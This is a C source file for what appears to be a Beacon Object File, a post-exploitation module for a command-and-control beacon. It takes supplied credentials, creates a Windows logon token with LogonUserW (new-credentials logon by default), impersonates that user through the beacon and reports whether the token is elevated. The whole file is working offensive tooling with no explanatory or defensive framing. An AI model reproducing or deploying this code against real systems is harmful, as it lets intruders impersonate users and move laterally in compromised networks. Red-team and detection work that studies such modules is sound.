#include <windows.h>
#include "beacon.h"

WINBASEAPI WINBOOL WINAPI ADVAPI32$LogonUserW(LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken );
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);
WINADVAPI  WINBOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
WINBASEAPI HANDLE  WINAPI KERNEL32$GetProcessHeap();
WINBASEAPI LPVOID  WINAPI KERNEL32$HeapAlloc (HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
WINBASEAPI BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, PVOID);
WINBASEAPI int     WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);

void _memset(void* ptr, int value, size_t num) {
    if (!ptr) return;
    unsigned char* p = (unsigned char*)ptr;
    while (num--) *p++ = (unsigned char)value;
}

BOOL TokenIsElevated(HANDLE hToken)
{
    BOOL result = FALSE;
    if (hToken) {
        TOKEN_ELEVATION Elevation = { 0 };
        DWORD eleavationSize = sizeof(TOKEN_ELEVATION);
        ADVAPI32$GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &eleavationSize);
        result = Elevation.TokenIsElevated;
    }
    return result;
}

VOID go( IN PCHAR Buffer, IN ULONG Length )
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    ULONG  userLen    = 0;
    WCHAR* username   = BeaconDataExtract(&parser, &userLen);
    WCHAR* password   = BeaconDataExtract(&parser, NULL);
    WCHAR* domain     = BeaconDataExtract(&parser, NULL);
    ULONG  token_type = BeaconDataInt(&parser);
    ULONG  logon_provider = 0;

    if( !username || !password || !domain )
        return;

    if ( 1 < token_type && token_type < 6 || token_type == 8 ) {
        logon_provider = LOGON32_PROVIDER_WINNT50;
    }
    else {
        token_type     = LOGON32_LOGON_NEW_CREDENTIALS;
        logon_provider = LOGON32_PROVIDER_WINNT50;
    }

    HANDLE hToken = NULL;
    if ( ADVAPI32$LogonUserW( username, domain, password, token_type, logon_provider, &hToken ) ) {
        if( BeaconUseToken(hToken) ) {
            char* user = KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, userLen / 2);
            KERNEL32$WideCharToMultiByte(CP_ACP, 0, username, userLen, user, userLen / 2, NULL, 0);

			if(TokenIsElevated(hToken))
		        BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully: %ls\\%s (logon: %d) [elevated]\n", domain, user, token_type);
			else
		        BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully: %ls\\%s (logon: %d)\n", domain, user, token_type);

            _memset(user, 0, userLen / 2);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, user);
        }
        else {
            BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate user. Error: %d\n", KERNEL32$GetLastError());
        }
    }
    else BeaconPrintf(CALLBACK_ERROR, "Failed to create token. Error: %d\n", KERNEL32$GetLastError());
}
